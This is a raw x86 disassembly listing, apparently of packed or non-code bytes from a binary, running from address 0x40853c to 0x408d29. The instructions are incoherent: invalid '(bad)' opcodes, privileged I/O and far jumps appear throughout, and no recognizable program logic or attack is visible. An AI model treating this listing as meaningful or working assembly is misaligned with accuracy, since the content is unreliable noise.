  40853c:	mov    cs,edi
  40853e:	push   edi
  40853f:	repnz push es
  408541:	add    edi,DWORD PTR [edx-0x54]
  408544:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408545:	or     DWORD PTR [edi-0x75],0xffffffda
  408549:	or     BYTE PTR [edi+0x179fde76],cl
  40854f:	mov    eax,ds:0xcb55656b
  408554:	ins    DWORD PTR es:[edi],dx
  408555:	add    al,0x2b
  408557:	imul   DWORD PTR [esi]
  408559:	xor    bl,cl
  40855b:	mov    ds:0x5ffd5c7,al
  408560:	pop    ebx
  408561:	iret   
  408562:	mov    al,ds:0x5d9df61f
  408567:	dec    esp
  408568:	jbe    0x4085a3
  40856a:	adc    eax,0xf28230da
  40856f:	adc    bl,BYTE PTR [ebx+edi*1+0x41]
  408573:	jns    0x408542
  408575:	jg     0x4085f1
  408577:	jae    0x408521
  408579:	ficom  WORD PTR [esp+eiz*8+0x65bea8ef]
  408580:	shl    BYTE PTR [ebp+0x7d89586d],1
  408586:	push   es
  408587:	or     al,0x87
  408589:	cmp    al,0x57
  40858b:	dec    ebx
  40858c:	mov    ebx,0x8c91399e
  408591:	(bad)  
  408592:	sub    BYTE PTR [edx],ah
  408594:	(bad)  
  408595:	xchg   edi,eax
  408596:	stos   BYTE PTR es:[edi],al
  408597:	inc    ecx
  408598:	push   esp
  408599:	mov    esi,0xbcf443f9
  40859e:	add    DWORD PTR [edx+0x4b],ecx
  4085a1:	adc    ebx,DWORD PTR [ebx+0x7cd3bd4d]
  4085a7:	fst    QWORD PTR ds:0xf95e1195
  4085ad:	push   esi
  4085ae:	mov    bh,0x36
  4085b0:	adc    BYTE PTR [ebp+0x4d],dl
  4085b3:	jnp    0x408565
  4085b5:	into   
  4085b6:	loop   0x408610
  4085b8:	(bad)  
  4085b9:	sbb    esp,DWORD PTR [ebp-0x4a]
  4085bc:	xor    BYTE PTR [esi+0x639aba2b],dh
  4085c2:	int3   
  4085c3:	xchg   edx,eax
  4085c4:	push   eax
  4085c5:	sub    eax,0x85b396c7
  4085ca:	stc    
  4085cb:	test   al,0xb2
  4085cd:	outs   dx,BYTE PTR ds:[esi]
  4085ce:	mov    eax,ds:0x4d3a5408
  4085d3:	add    al,0xef
  4085d5:	(bad)  
  4085d6:	cli    
  4085d7:	inc    edx
  4085d8:	and    al,0x8f
  4085da:	jne    0x4085e0
  4085dc:	hlt    
  4085dd:	inc    eax
  4085de:	ror    cl,cl
  4085e0:	push   ecx
  4085e1:	ror    BYTE PTR [eax],0x64
  4085e4:	fs inc eax
  4085e6:	ds out 0x5b,eax
  4085e9:	data16 lock ds clc 
  4085ed:	rcl    edi,cl
  4085ef:	xchg   esp,eax
  4085f0:	inc    ebx
  4085f1:	pop    esi
  4085f2:	das    
  4085f3:	mov    ?,WORD PTR [eax-0x7b]
  4085f6:	jmp    0x6f93:0x76d8823b
  4085fd:	cmp    edi,ebp
  4085ff:	dec    ecx
  408600:	pop    ss
  408601:	fbstp  TBYTE PTR [edi]
  408603:	pop    es
  408604:	and    eax,0xbebe5e80
  408609:	adc    al,0xfa
  40860b:	cld    
  40860c:	loop   0x4085a3
  40860e:	lock xor dh,BYTE PTR [eax+ecx*4+0x2196a3af]
  408616:	test   eax,0x56dbb6e7
  40861b:	loope  0x4085e3
  40861d:	retf   
  40861e:	(bad)  
  40861f:	sti    
  408620:	inc    esi
  408621:	outs   dx,DWORD PTR ds:[esi]
  408622:	in     al,0xba
  408624:	test   BYTE PTR [ebx],ah
  408626:	jb     0x40862b
  408628:	sub    DWORD PTR fs:[ecx+0x2],ecx
  40862c:	pushf  
  40862d:	mov    bh,0x8e
  40862f:	xlat   BYTE PTR ds:[ebx]
  408630:	mov    WORD PTR [edi],?
  408632:	mov    ecx,0x43cf032c
  408637:	inc    esi
  408638:	mov    dl,0x68
  40863a:	mov    ?,WORD PTR [ecx]
  40863c:	stos   BYTE PTR es:[edi],al
  40863d:	repnz ror DWORD PTR [ebx+esi*8],0xd9
  408642:	jbe    0x408668
  408644:	ja     0x4085fb
  408646:	jmp    0xdb0c:0x964fa0e3
  40864d:	cs ret 0x6c4c
  408651:	arpl   WORD PTR [edx],dx
  408653:	sbb    eax,0x2be07617
  408658:	aam    0xb9
  40865a:	outs   dx,BYTE PTR ds:[esi]
  40865b:	loope  0x4086c0
  40865d:	mov    ds:0xf9988975,eax
  408662:	sbb    eax,0x566fe464
  408667:	jns    0x408636
  408669:	inc    esp
  40866a:	add    eax,0x1ce917
  40866f:	push   0x1b
  408671:	add    cl,BYTE PTR [esi+0x56d1b3a3]
  408677:	jl     0x40862e
  408679:	scas   al,BYTE PTR es:[edi]
  40867a:	pop    edi
  40867b:	pop    es
  40867c:	bound  ebp,QWORD PTR [ebp+0x57fc727c]
  408682:	(bad)  
  408683:	push   cs
  408684:	xchg   ebx,eax
  408685:	dec    ebx
  408686:	imul   esi,DWORD PTR [edi],0xffffffd0
  408689:	cmp    ah,BYTE PTR [ebp-0x1492a6d2]
  40868f:	cmp    esi,DWORD PTR [esi]
  408691:	dec    edi
  408692:	loopne 0x408642
  408694:	outs   dx,BYTE PTR ds:[esi]
  408695:	jl     0x408632
  408697:	adc    BYTE PTR [esi+0xfc17981],dl
  40869d:	mov    ebx,0xf1e486c1
  4086a2:	xchg   esp,eax
  4086a3:	and    DWORD PTR [ebp-0x5c039743],esi
  4086a9:	inc    esi
  4086aa:	jo     0x40866d
  4086ac:	sahf   
  4086ad:	test   eax,0xa52cd50f
  4086b2:	add    BYTE PTR [ebx+0x6e69b1ce],bh
  4086b8:	adc    eax,0x83c4a740
  4086bd:	dec    edx
  4086be:	ss inc eax
  4086c0:	int3   
  4086c1:	add    BYTE PTR [esi+0x7eb0bd0d],ch
  4086c7:	add    eax,0x5e24f2e0
  4086cc:	cmp    ch,ah
  4086ce:	cmp    al,0xa0
  4086d0:	ds mov al,0xb0
  4086d3:	mov    eax,0xa6106b13
  4086d8:	icebp  
  4086d9:	and    edi,DWORD PTR [ecx-0x3b57732]
  4086df:	clc    
  4086e0:	and    BYTE PTR [edi],0x3f
  4086e3:	(bad)  
  4086e4:	and    edi,eax
  4086e6:	in     al,0xb6
  4086e8:	inc    edi
  4086e9:	push   ss
  4086ea:	loope  0x4086ff
  4086ec:	ss in  eax,dx
  4086ee:	push   ss
  4086ef:	arpl   WORD PTR [edi+0x402a9fc7],dx
  4086f5:	dec    esi
  4086f6:	adc    eax,0x66893f26
  4086fb:	(bad)  
  4086fc:	out    0xcc,al
  4086fe:	aam    0x26
  408700:	cdq    
  408701:	sar    cl,0xf7
  408704:	inc    edi
  408705:	into   
  408706:	xchg   edx,eax
  408707:	push   edi
  408708:	les    esp,FWORD PTR [ebx-0x3e]
  40870b:	push   ds
  40870c:	int3   
  40870d:	pop    ds
  40870e:	sub    DWORD PTR [ebp-0x12],esp
  408711:	cmp    BYTE PTR [edx],cl
  408713:	cmp    eax,0x12e7fea8
  408718:	jo     0x4086f7
  40871a:	mov    ebx,0x69254204
  40871f:	jecxz  0x408743
  408721:	mov    cl,BYTE PTR [edi]
  408723:	mov    eax,ebp
  408725:	jge    0x40878b
  408727:	in     al,dx
  408728:	cmp    eax,0x2cdde83
  40872d:	mov    ds:0x85735a45,al
  408732:	mov    ebx,0x916726eb
  408737:	mov    dl,0x26
  408739:	fnstcw WORD PTR [esi]
  40873b:	scas   al,BYTE PTR es:[edi]
  40873c:	imul   esp,DWORD PTR [edi],0x8855e0b9
  408742:	inc    edi
  408743:	retf   0x7c44
  408746:	jns    0x40877d
  408748:	ja     0x40877f
  40874a:	mov    cl,al
  40874c:	loopne 0x408762
  40874e:	in     al,0xb3
  408750:	stc    
  408751:	xchg   edx,ebx
  408753:	std    
  408754:	jg     0x408719
  408756:	pop    esi
  408757:	dec    edx
  408758:	push   esp
  408759:	test   BYTE PTR [edx-0x67],ch
  40875c:	cmp    BYTE PTR [esi+0x204315a5],ch
  408762:	outs   dx,DWORD PTR ds:[esi]
  408763:	jmp    0xd5cf6e65
  408768:	mov    ch,0xa
  40876a:	adc    eax,0x8368570
  40876f:	xor    al,0x80
  408771:	pop    esi
  408772:	test   al,0x74
  408774:	enter  0x126d,0x4d
  408778:	sub    BYTE PTR [edx],dh
  40877a:	retf   
  40877b:	xchg   esp,eax
  40877c:	int    0x33
  40877e:	sti    
  40877f:	(bad)  
  408780:	xor    eax,edi
  408782:	dec    ebp
  408783:	xchg   esp,eax
  408784:	es push es
  408786:	jecxz  0x408710
  408788:	clc    
  408789:	mov    ebx,0x658643f4
  40878e:	ss repz aam 0x9c
  408792:	cmp    bh,BYTE PTR [ecx]
  408794:	cli    
  408795:	out    dx,eax
  408796:	add    eax,0x476d3ac7
  40879b:	fwait
  40879c:	pop    ecx
  40879d:	aas    
  40879e:	push   eax
  40879f:	js     0x4087dc
  4087a1:	fstp   DWORD PTR [edx]
  4087a3:	fwait
  4087a4:	or     DWORD PTR [bx+si-0x6f04],0xffffffd1
  4087aa:	inc    edi
  4087ab:	adc    eax,0x4e3b621e
  4087b0:	mov    ds:0x6d61a6d9,al
  4087b5:	ret    0x4c30
  4087b8:	jmp    0xd9e08edf
  4087bd:	clc    
  4087be:	sbb    dl,BYTE PTR [edi]
  4087c0:	jb     0x408812
  4087c2:	jno    0x40878e
  4087c4:	je     0x40882d
  4087c6:	add    DWORD PTR [edi+eiz*2],esi
  4087c9:	jecxz  0x4087c7
  4087cb:	xchg   ecx,eax
  4087cc:	mov    esp,0x2b0e9a64
  4087d1:	fistp  QWORD PTR [edi-0x31c3dc14]
  4087d7:	(bad)  
  4087d8:	outs   dx,DWORD PTR ds:[esi]
  4087d9:	nop
  4087da:	fistp  WORD PTR [ebx-0x21]
  4087dd:	mov    ah,0x4
  4087df:	or     bl,BYTE PTR [ebp-0x20433577]
  4087e5:	(bad)  
  4087e6:	cli    
  4087e7:	icebp  
  4087e8:	mov    ah,0xa9
  4087ea:	jno    0x4087bf
  4087ec:	jbe    0x4087fd
  4087ee:	inc    esp
  4087ef:	out    0x3f,al
  4087f1:	dec    esp
  4087f2:	imul   esp,DWORD PTR [edx],0x200a1577
  4087f8:	xor    eax,0x42f759cf
  4087fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4087fe:	push   0xbd24eebe
  408803:	aaa    
  408804:	mov    esp,0x38aa9a99
  408809:	in     eax,0xf0
  40880b:	aad    0x15
  40880d:	adc    al,0xc1
  40880f:	scas   al,BYTE PTR es:[edi]
  408810:	popf   
  408811:	or     al,0xff
  408813:	mov    al,0x67
  408815:	sbb    edi,esi
  408817:	inc    esi
  408818:	sti    
  408819:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40881a:	push   0xada21db7
  40881f:	cmp    eax,0x6dfd9eab
  408824:	jb     0x408894
  408826:	ror    BYTE PTR [esi-0x16276dbf],1
  40882c:	sub    DWORD PTR [esi+0x2],esi
  40882f:	or     al,0xfe
  408831:	add    eax,0x7caac648
  408836:	mov    edi,0xe96b4c5e
  40883b:	loope  0x408804
  40883d:	rdmsr  
  40883f:	popa   
  408840:	add    DWORD PTR [eax+edx*2-0x2f16bde8],eax
  408847:	cmp    eax,DWORD PTR [ebx]
  408849:	jp     0x40887a
  40884b:	jmp    0x133e362f
  408850:	cmp    DWORD PTR [ebp+edx*4-0x4378e152],edi
  408857:	test   DWORD PTR [ecx+0x77642c15],esi
  40885d:	loope  0x40885a
  40885f:	mov    edx,?
  408861:	test   eax,0x18a5485
  408866:	loopne 0x4087fd
  408868:	ins    DWORD PTR es:[edi],dx
  408869:	nop
  40886a:	pop    es
  40886b:	data16 loope 0x408892
  40886e:	or     DWORD PTR [ebp+0x67],ebx
  408871:	pop    edx
  408872:	in     eax,dx
  408873:	nop
  408874:	pop    edi
  408875:	lods   al,BYTE PTR ds:[esi]
  408876:	pop    ecx
  408877:	add    BYTE PTR [esi],bl
  408879:	sub    DWORD PTR [eax-0x50827724],ecx
  40887f:	jecxz  0x40888d
  408881:	xchg   BYTE PTR [edi],dl
  408883:	cld    
  408884:	inc    esp
  408885:	mov    cl,0x1c
  408887:	std    
  408888:	stos   DWORD PTR es:[edi],eax
  408889:	push   ss
  40888a:	in     eax,dx
  40888b:	inc    edx
  40888c:	xchg   esp,eax
  40888d:	push   esp
  40888e:	dec    ebp
  40888f:	sbb    ebp,edx
  408891:	mov    cl,0x9c
  408893:	lock cmp eax,0x6210cde6
  408899:	imul   esi,DWORD PTR ds:0x819fdaa0,0x54096b8b
  4088a3:	jb     0x408867
  4088a5:	cs pop ebx
  4088a7:	rcr    BYTE PTR [ebp+0x6f],cl
  4088aa:	mov    ds:0xbc7115cc,al
  4088af:	pop    ds
  4088b0:	mov    ecx,ecx
  4088b2:	jl     0x40891a
  4088b4:	sbb    esp,DWORD PTR [esi+0x2b]
  4088b7:	xchg   ebx,eax
  4088b8:	push   esp
  4088b9:	js     0x4088d6
  4088bb:	mov    ds:0xda668be3,eax
  4088c0:	mov    edx,0x9d389635
  4088c5:	mov    dl,ch
  4088c7:	sub    eax,0xd7486615
  4088cc:	mov    es,WORD PTR [edi-0x74e3f67e]
  4088d2:	xchg   edi,eax
  4088d3:	add    DWORD PTR [edi-0x68],0xa2116238
  4088da:	jl     0x408896
  4088dc:	ins    DWORD PTR es:[edi],dx
  4088dd:	mov    ah,0xd6
  4088df:	or     BYTE PTR [eax-0x3e],0xa8
  4088e3:	repz ja 0x4088c5
  4088e6:	in     al,dx
  4088e7:	cs cmp edx,ecx
  4088ea:	repz das 
  4088ec:	cmp    ch,bl
  4088ee:	pushf  
  4088ef:	cwde   
  4088f0:	mov    esi,ebp
  4088f2:	add    dl,dh
  4088f4:	jmp    0x15c1:0xd1b776f2
  4088fb:	mov    ebp,0x3173af87
  408900:	sub    BYTE PTR [edi+0x183126ce],0xb1
  408907:	mov    ch,0x2a
  408909:	lods   al,BYTE PTR ds:[esi]
  40890a:	retf   0x363a
  40890d:	(bad)  
  40890f:	aas    
  408910:	div    dh
  408912:	xchg   ecx,eax
  408913:	stos   DWORD PTR es:[edi],eax
  408914:	xchg   esp,eax
  408915:	js     0x4088e9
  408917:	js     0x4088fd
  408919:	or     eax,ecx
  40891b:	aaa    
  40891c:	cs inc ebx
  40891e:	adc    eax,0x81192270
  408923:	(bad)  
  408925:	adc    ch,BYTE PTR [esi]
  408927:	stos   DWORD PTR es:[edi],eax
  408928:	mov    WORD PTR [ebp+0x56853b73],?
  40892e:	leave  
  40892f:	fcomp  DWORD PTR [edx]
  408931:	inc    ebx
  408932:	ror    BYTE PTR [edi-0x1],cl
  408935:	in     al,dx
  408936:	jle    0x40892c
  408938:	test   DWORD PTR [ebp-0x151cb5f5],0xb21f3c68
  408942:	xchg   ecx,eax
  408943:	mov    edi,0xb012feee
  408948:	test   eax,0x6337caa1
  40894d:	sti    
  40894e:	and    edi,ebx
  408950:	test   esi,esi
  408952:	push   es
  408953:	shl    DWORD PTR [edx+0x4c5b2cbe],1
  408959:	es push ds
  40895b:	ret    0x7388
  40895e:	cmp    al,0x1b
  408960:	rcr    DWORD PTR [esi-0x76d6a08f],1
  408966:	add    BYTE PTR [edi+0x6b988c3b],ah
  40896c:	jecxz  0x408900
  40896e:	cmp    eax,0xcedfdf5e
  408973:	push   edx
  408974:	ficom  WORD PTR [edi]
  408976:	dec    esi
  408977:	es out dx,al
  408979:	xchg   edx,eax
  40897a:	call   0x599c:0x5ad8901a
  408981:	ret    
  408982:	sub    al,0x38
  408984:	cmp    al,0x4d
  408987:	xchg   esi,eax
  408988:	mov    BYTE PTR [ebx-0xc],dl
  40898b:	or     ch,BYTE PTR [ecx]
  40898d:	ret    
  40898e:	ret    0x2359
  408991:	shr    BYTE PTR [eax+0x5b],1
  408994:	test   DWORD PTR [esi],0xcf9af11
  40899a:	jmp    0x3621:0x617579fe
  4089a1:	icebp  
  4089a2:	mov    eax,esi
  4089a4:	js     0x4089b0
  4089a6:	add    ch,0x45
  4089a9:	out    0x92,eax
  4089ab:	nop
  4089ac:	and    al,0xca
  4089ae:	mov    DWORD PTR ds:0x219e883,esi
  4089b4:	cwde   
  4089b5:	mov    dh,0xea
  4089b7:	(bad)  ds:0xe250c358
  4089bd:	push   0x38
  4089bf:	xchg   ecx,eax
  4089c0:	addr16 fwait
  4089c2:	inc    esi
  4089c3:	add    eax,0x33df5d8a
  4089c8:	xchg   esp,eax
  4089c9:	call   0xb5358065
  4089ce:	stc    
  4089cf:	les    edx,FWORD PTR [ebp-0x726c67fc]
  4089d5:	mov    cl,0x9a
  4089d7:	xor    al,0x9f
  4089d9:	clc    
  4089da:	sar    BYTE PTR [ebx],cl
  4089dc:	sbb    dh,0xa3
  4089df:	add    edi,DWORD PTR [ebp+edx*1-0x7e]
  4089e3:	sti    
  4089e4:	push   0xffffffa1
  4089e6:	loop   0x408a2f
  4089e8:	jmp    0x4089e6
  4089ea:	mov    ds:0x6fed1a97,al
  4089ef:	inc    ecx
  4089f0:	dec    esp
  4089f1:	test   al,0x56
  4089f3:	push   es
  4089f4:	aas    
  4089f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4089f6:	hlt    
  4089f7:	ss loop 0x408a48
  4089fa:	mov    al,0x12
  4089fc:	fmul   QWORD PTR [ecx-0x49a707ba]
  408a02:	shl    DWORD PTR [ebp+0x2191d209],cl
  408a08:	daa    
  408a09:	adc    al,dl
  408a0b:	icebp  
  408a0c:	arpl   dx,bp
  408a0e:	xchg   edx,eax
  408a0f:	jnp    0x408a27
  408a11:	daa    
  408a12:	fdiv   DWORD PTR [ebx]
  408a14:	lahf   
  408a15:	xchg   ebp,eax
  408a16:	and    BYTE PTR [eax+0x24],dl
  408a19:	leave  
  408a1a:	fld    QWORD PTR [eax-0x534fd935]
  408a20:	cmc    
  408a21:	frstor [ebx-0x7582a9c]
  408a27:	nop
  408a28:	and    esi,DWORD PTR [esi+edi*2]
  408a2b:	enter  0xc159,0x69
  408a2f:	jb     0x408a78
  408a31:	repz faddp st(2),st
  408a34:	pop    esp
  408a35:	rcr    DWORD PTR [ebx],1
  408a37:	nop
  408a38:	push   ebp
  408a39:	dec    edx
  408a3a:	inc    esi
  408a3b:	push   esi
  408a3c:	jl     0x4089f8
  408a3e:	xlat   BYTE PTR ds:[ebx]
  408a3f:	add    dh,BYTE PTR [ebp+0x4dfc7c71]
  408a45:	xchg   edi,eax
  408a46:	ret    0xebee
  408a49:	jl     0x408a10
  408a4b:	or     al,0x66
  408a4d:	dec    esi
  408a4e:	or     dl,BYTE PTR [edx-0x70]
  408a51:	xchg   esi,eax
  408a52:	pop    ebp
  408a53:	sar    ch,cl
  408a55:	push   ebp
  408a56:	or     al,0xc9
  408a58:	leave  
  408a59:	xchg   esi,eax
  408a5a:	inc    edx
  408a5b:	in     eax,dx
  408a5c:	push   esp
  408a5d:	sub    al,0xc8
  408a5f:	adc    DWORD PTR [ebp+0x35],edi
  408a62:	inc    edx
  408a63:	sub    al,0xef
  408a65:	scas   al,BYTE PTR es:[edi]
  408a66:	call   0x4c42:0xa6154c5d
  408a6d:	push   esp
  408a6e:	mov    eax,cs
  408a70:	not    esp
  408a72:	pop    edx
  408a73:	and    BYTE PTR [ecx],0xf9
  408a76:	shl    DWORD PTR [ecx+0x78],cl
  408a79:	shl    ch,0x26
  408a7c:	pop    edi
  408a7d:	mov    al,0x13
  408a7f:	je     0x408aa1
  408a81:	dec    ebp
  408a82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a83:	add    bh,BYTE PTR [ebx]
  408a85:	push   DWORD PTR [edi+0x30d546fa]
  408a8b:	mov    ?,eax
  408a8d:	jl     0x408ab7
  408a8f:	int3   
  408a90:	jbe    0x408a3c
  408a92:	mov    dl,0x79
  408a94:	cmp    eax,esp
  408a96:	and    ebx,DWORD PTR [ebp-0x12]
  408a99:	adc    eax,0x5acc6b82
  408a9e:	ja     0x408a65
  408aa0:	es add esp,eax
  408aa3:	fstp   st(5)
  408aa5:	inc    edx
  408aa6:	fwait
  408aa7:	add    DWORD PTR [ecx+eiz*8-0x4bcc5a42],ecx
  408aae:	mov    bl,0xe9
  408ab0:	push   ecx
  408ab1:	dec    edi
  408ab2:	or     eax,0x608d3663
  408ab7:	mov    edi,0x58534b1
  408abc:	mov    ds:0x746fd397,al
  408ac1:	call   0x1d3:0x4d849360
  408ac8:	idiv   DWORD PTR [eax]
  408aca:	and    DWORD PTR [ebx+0x68],ecx
  408acd:	mov    eax,0xca3a797d
  408ad2:	xor    DWORD PTR [esi+0x38],ebp
  408ad5:	jno    0x408af1
  408ad7:	mov    ebp,0x48f0ea1c
  408adc:	xor    DWORD PTR [edi],0xe6f68c4
  408ae2:	shr    dl,cl
  408ae4:	jo     0x408a95
  408ae6:	mov    edx,0xe542488
  408aeb:	ret    
  408aec:	int3   
  408aed:	arpl   WORD PTR [eax],bp
  408aef:	out    0xd8,eax
  408af1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408af2:	dec    esp
  408af3:	sar    DWORD PTR [esi],0x7e
  408af6:	dec    esp
  408af7:	adc    DWORD PTR [edi-0x7fb57fc],0x24
  408afe:	dec    esi
  408aff:	push   es
  408b00:	push   esi
  408b01:	pop    ss
  408b02:	or     esi,ebx
  408b04:	or     al,0x7
  408b06:	lods   al,BYTE PTR ds:[esi]
  408b07:	scas   eax,DWORD PTR es:[edi]
  408b08:	jne    0x408b19
  408b0a:	push   esp
  408b0b:	out    0x43,eax
  408b0d:	jae    0x408af0
  408b0f:	jo     0x408aa7
  408b11:	inc    ebx
  408b12:	inc    ebp
  408b13:	dec    edi
  408b14:	scas   al,BYTE PTR es:[edi]
  408b15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b16:	or     eax,0x1ea90064
  408b1b:	idiv   DWORD PTR [edx+0x59062e02]
  408b21:	adc    DWORD PTR [eax],edx
  408b23:	dec    eax
  408b24:	cli    
  408b25:	push   ss
  408b26:	cmp    BYTE PTR [edx-0x1d],0x76
  408b2a:	cmp    BYTE PTR [esi-0xe],dh
  408b2d:	enter  0x333a,0x3
  408b31:	pop    esi
  408b32:	cmp    esi,DWORD PTR [ebx]
  408b34:	cmp    ebp,DWORD PTR [edi-0x63]
  408b37:	push   ebx
  408b38:	loop   0x408b87
  408b3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b3c:	push   cs
  408b3d:	xor    BYTE PTR [edi],bh
  408b3f:	rol    DWORD PTR [edi-0xc],cl
  408b42:	xor    DWORD PTR [ebp-0x5a],ebp
  408b45:	push   edi
  408b46:	sub    DWORD PTR fs:[ebp+0x1d7761f9],edx
  408b4d:	iret   
  408b4e:	out    0x1,al
  408b50:	add    ah,BYTE PTR [edx-0x27]
  408b53:	ret    0xa042
  408b56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b57:	mov    edi,0x2d7ccc10
  408b5c:	adc    BYTE PTR [edi],ah
  408b5e:	repnz rcr BYTE PTR [esi],0xd4
  408b62:	mov    ebp,0xcd830b1d
  408b67:	fsub   QWORD PTR [ebp-0x47]
  408b6a:	inc    ecx
  408b6b:	fist   WORD PTR [edi]
  408b6d:	fwait
  408b6e:	cwde   
  408b6f:	popa   
  408b70:	mov    bh,0xac
  408b72:	inc    ebx
  408b73:	lods   al,BYTE PTR ds:[esi]
  408b74:	mov    bh,0x3f
  408b76:	or     ecx,DWORD PTR [esi]
  408b78:	mov    ah,0x5c
  408b7a:	ror    BYTE PTR [edx+0x7d3e9ffc],1
  408b80:	inc    esp
  408b81:	adc    BYTE PTR [ecx+0x45ada003],0x7c
  408b88:	sar    DWORD PTR [eax],0x2
  408b8b:	sub    DWORD PTR [esi],esp
  408b8d:	add    al,0xa6
  408b8f:	mov    ah,0x6b
  408b91:	push   ebx
  408b92:	inc    edi
  408b93:	cmp    BYTE PTR [edi-0x665cf920],dl
  408b99:	cmp    eax,0x38a78cc4
  408b9e:	jg     0x408c1e
  408ba0:	push   ds
  408ba1:	test   eax,0xde98b076
  408ba6:	pop    ecx
  408ba7:	jnp    0x408bef
  408ba9:	or     BYTE PTR [edx-0x32],al
  408bac:	lds    ebx,FWORD PTR [ebx-0x32bcdb0d]
  408bb2:	aad    0x71
  408bb4:	and    dh,BYTE PTR [ecx]
  408bb6:	mov    dl,0xac
  408bb8:	fcom   QWORD PTR [edi+0x52cc01cb]
  408bbe:	dec    ebx
  408bbf:	imul   esp,DWORD PTR [ebx-0x9],0x79137135
  408bc6:	jl     0x408b54
  408bc8:	mov    al,0x7f
  408bca:	sub    eax,0xa7ffaf9f
  408bcf:	enter  0x6fdb,0x78
  408bd3:	fsubr  st(6),st
  408bd5:	jo     0x408bbf
  408bd7:	pop    eax
  408bd8:	xor    DWORD PTR [ecx-0x7623b743],edi
  408bde:	xchg   esi,eax
  408bdf:	xchg   ecx,eax
  408be0:	call   0xb6c9e89f
  408be5:	mov    cl,bl
  408be7:	lea    edi,[ecx+0x28]
  408bea:	out    0xd1,eax
  408bec:	out    dx,eax
  408bed:	nop
  408bee:	test   BYTE PTR [esi+0x755ff6dc],dl
  408bf4:	fmulp  st(6),st
  408bf6:	mov    ebp,0x1408ef91
  408bfb:	add    bh,0x99
  408bfe:	inc    ebp
  408bff:	dec    ecx
  408c00:	jns    0x408c6e
  408c02:	lock mov edi,0x2207868b
  408c08:	mov    ebx,0xa49bddb9
  408c0d:	push   eax
  408c0e:	shl    BYTE PTR [ebp+0x58],1
  408c11:	mov    eax,ds:0xd0509be1
  408c16:	jmp    0x723a:0x4c240258
  408c1d:	xchg   edx,eax
  408c1e:	shr    DWORD PTR [edx+0x587b84c3],1
  408c24:	pop    ss
  408c25:	das    
  408c26:	shr    edi,1
  408c28:	rcr    BYTE PTR [edi+0x3e977fcc],0x2e
  408c2f:	pop    es
  408c30:	jg     0x408c28
  408c32:	mov    al,ds:0xefbd5b9f
  408c37:	loopne 0x408c0b
  408c39:	into   
  408c3a:	and    edx,edi
  408c3c:	dec    esi
  408c3d:	retf   
  408c3e:	in     al,0xf2
  408c40:	or     BYTE PTR [esp+eax*8+0x13ecd974],ch
  408c47:	imul   DWORD PTR [edx]
  408c49:	enter  0x44f3,0xd7
  408c4d:	adc    ecx,edi
  408c4f:	icebp  
  408c50:	clc    
  408c51:	imul   DWORD PTR [edx+0x26fece55]
  408c57:	ss ss pusha 
  408c5a:	ret    
  408c5b:	xchg   BYTE PTR [ecx],ch
  408c5d:	mov    bl,0xbc
  408c5f:	jo     0x408bf6
  408c61:	xor    BYTE PTR [esi+eiz*2-0x71237315],dl
  408c68:	mov    esi,0x233cb4e3
  408c6d:	daa    
  408c6e:	mov    esp,cs
  408c70:	dec    edi
  408c71:	dec    ecx
  408c72:	fwait
  408c73:	jns    0x408ced
  408c75:	mov    ah,0x55
  408c77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c78:	in     eax,dx
  408c79:	mov    esi,0xb254a657
  408c7e:	push   0xff703f82
  408c83:	vcmppd ymm4,ymm3,YMMWORD PTR [ebx+ebx*2-0x7da00fda],0x5a
  408c8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c8e:	inc    edi
  408c8f:	out    dx,eax
  408c90:	mov    eax,0x6fceae13
  408c95:	inc    ebx
  408c96:	lea    esp,[esi+esi*8]
  408c99:	and    bl,ah
  408c9b:	adc    edx,DWORD PTR [ebp-0x316725a9]
  408ca1:	xchg   edx,eax
  408ca2:	xlat   BYTE PTR ds:[ebx]
  408ca3:	jle    0x408cad
  408ca5:	(bad)  
  408ca6:	mov    ebx,0x4e5396c7
  408cab:	push   ecx
  408cac:	pop    ebx
  408cad:	adc    DWORD PTR [eax],edi
  408caf:	or     al,0x7f
  408cb1:	sbb    al,0x97
  408cb3:	jp     0x408c38
  408cb5:	lea    eax,[ecx-0x75]
  408cb8:	scas   al,BYTE PTR es:[edi]
  408cb9:	sbb    eax,0x267e1d05
  408cbe:	popf   
  408cbf:	xsaveopt [ebx]
  408cc2:	add    BYTE PTR [ecx+0x5a],dl
  408cc5:	dec    edx
  408cc6:	xchg   ecx,eax
  408cc7:	add    dh,BYTE PTR [edx-0x4010f9f0]
  408ccd:	sti    
  408cce:	shr    al,cl
  408cd0:	js     0x408c9c
  408cd2:	ds sar al,1
  408cd5:	(bad)  
  408cd6:	sbb    ecx,ecx
  408cd8:	xor    al,0x8
  408cda:	pop    ecx
  408cdb:	es pop edx
  408cdd:	cmp    DWORD PTR ds:0x30b0c71d,eax
  408ce3:	jg     0x408c98
  408ce5:	(bad)  [edx]
  408ce7:	int3   
  408ce8:	push   edi
  408ce9:	loop   0x408c83
  408ceb:	ds pop ebx
  408ced:	xchg   edx,eax
  408cee:	adc    al,0x18
  408cf0:	inc    esi
  408cf1:	or     esp,edx
  408cf3:	cmp    cl,al
  408cf5:	iret   
  408cf6:	jmp    0x408d40
  408cf8:	cld    
  408cf9:	jne    0x408d4a
  408cfb:	scas   al,BYTE PTR es:[edi]
  408cfc:	loope  0x408c82
  408cfe:	inc    eax
  408cff:	fisub  WORD PTR [eax]
  408d01:	xchg   edi,eax
  408d02:	shr    DWORD PTR [bx+0x2d73],cl
  408d07:	mov    eax,0x19cca3ae
  408d0c:	dec    al
  408d0e:	mov    dh,0xf5
  408d10:	adc    DWORD PTR [ecx],ebx
  408d12:	add    eax,0xc44af6e6
  408d17:	aad    0x22
  408d19:	popa   
  408d1a:	mov    ds:0x3ed7163,al
  408d1f:	out    0x43,eax
  408d21:	mov    al,0xa
  408d23:	loop   0x408d21
  408d25:	add    dh,BYTE PTR [edx]
  408d27:	fnstsw WORD PTR [edx]
  408d29:	aam    0x95
